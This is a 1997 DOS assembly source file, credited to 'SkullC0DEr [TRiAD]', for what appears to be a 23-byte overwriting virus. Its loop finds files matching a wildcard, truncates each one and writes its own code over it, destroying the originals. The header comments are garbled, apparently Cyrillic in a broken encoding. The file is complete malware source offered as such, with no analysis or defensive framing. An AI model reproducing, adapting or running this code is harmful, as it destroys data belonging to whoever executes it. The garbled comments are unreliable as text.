                ;       [S]1997 SkullC0DEr [TRiAD]
                ;
                ;       ���� �����쪨� ����ࠩ�� (�����, imho, 㦥 ���㤠 �:)
                ;       ������: 23 ����
                ;       ����஢����: *.*
                ;       �⠡��쭮���: ������ �� ���ﭨ� ॣ���஢ �� ����᪥
                ;       �ॡ������ � CPU: 8086
                ;       ����砭��: ����� �� ���� ��� ������묨 ����ﬨ ���

CSEG            SEGMENT
		ORG	100H
		ASSUME	CS:CSEG,DS:CSEG,ES:CSEG,SS:CSEG
START:
                SUB     CH,BYTE PTR DS:[2AH]
                MOV     AH,4EH
ST_1:
                MOV     DX,SI
                INT     21H
                MOV     AH,3CH
                MOV     DX,9EH
                INT     21H
                XCHG    BX,AX
                MOV     AH,40H
                JNC     ST_1
                RETN
CSEG		ENDS
		END	START
